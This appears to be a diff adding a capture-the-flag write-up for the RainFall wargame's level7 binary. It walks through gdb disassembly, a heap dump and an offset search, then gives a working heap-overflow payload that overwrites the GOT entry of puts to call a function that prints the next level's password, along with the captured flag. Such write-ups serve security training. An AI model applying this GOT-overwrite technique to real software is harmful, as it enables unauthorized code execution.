@@ -1,0 +1,146 @@
+Program recieve 2 arguments
+
+level7@RainFall:~$ ./level7 1 1
+~~
+
+Function m prints buffer c which content is equal to "/home/user/level8/.pass", that means we need to call it.
+
+(gdb) 
+Dump of assembler code for function m:
+   0x080484f4 <+0>:     push   %ebp
+   ...
+
+m's functiona address 0x080484f4 = \xf4\x84\x04\x08
+
+Then we put breakpoint after each malloc(), define hook-step and look at heap
+
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>i r eax
+>x/64wx 0x804a000
+>end
+
+We examine 0x804a000 cause thats where heap starts, we could see it from next command's output
+
+(gdb) info proc mapping
+process 2702
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+         0x804a000  0x806b000    0x21000        0x0 [heap]
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+Set breakpoints and run program
+
+(gdb) r 1111222233334444 55556666777788889999
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 1111222233334444 55556666777788889999
+...
+(gdb) c
+...
+(gdb) c
+Continuing.
+*** glibc detected *** /home/user/level7/level7: free(): invalid next size (normal): 0x0804a048 ***
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
+/lib/i386-linux-gnu/libc.so.6(+0x64e55)[0xb7e90e55]
+/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb7e90e8b]
+/home/user/level7/level7[0x80485d8]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
+/home/user/level7/level7[0x8048461]
+======= Memory map: ========
+08048000-08049000 r-xp 00000000 00:10 12293      /home/user/level7/level7
+08049000-0804a000 rwxp 00000000 00:10 12293      /home/user/level7/level7
+0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
+b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
+b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
+b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
+b7fda000-b7fdd000 rwxp 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+
+Program received signal SIGABRT, Aborted.
+eax            0x0      0
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x31313131      0x32323232
+0x804a020:      0x33333333      0x34343434      0x00000000      0x0804a038
+0x804a030:      0x00000000      0x00000011      0x35353535      0x36363636
+0x804a040:      0x37373737      0x00000169      0xfbad240c      0x00000000
+0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a070:      0x00000000      0x00000000      0x00000000      0xb7fd1980
+0x804a080:      0xffffffff      0x00000000      0x00000000      0x00000000
+0x804a090:      0x0804a0e0      0xffffffff      0xffffffff      0x00000000
+0x804a0a0:      0x0804a0ec      0x00000000      0x00000000      0x00000000
+0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0d0:      0x00000000      0x00000000      0x00000000      0xb7fd0a80
+0x804a0e0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
+0xb7fdd428 in __kernel_vsyscall ()
+
+Since we can write to GOT we can make puts call function m. 
+
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
+   ...
+
+0x8049928 = \x28\x99\x04\x08
+
+Find offset:
+
+(gdb) run AAAABBBBCCCCDDDDEEEEFFFF 0000111122223333444455556666
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFF 0000111122223333444455556666
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x46464646       1179010630
+ecx            0xbffff8f8       -1073743624
+edx            0x46464646       1179010630
+ebx            0xbffff900       -1073743616
+esp            0xbffff6d4       0xbffff6d4
+ebp            0xbffff708       0xbffff708
+esi            0x0      0
+edi            0x46464646       1179010630
+eip            0xb7eb8b59       0xb7eb8b59
+eflags         0x210286 [ PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+for first argument offset will be at FFFF (0x46464646) which means t equals to 20
+
+level7@RainFall:~$ ./level7 $(python -c "print '\x41' * 20 + '\x28\x99\x04\x08'") $'\xf4\x84\x04\x08'
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1680288183
+
+ 
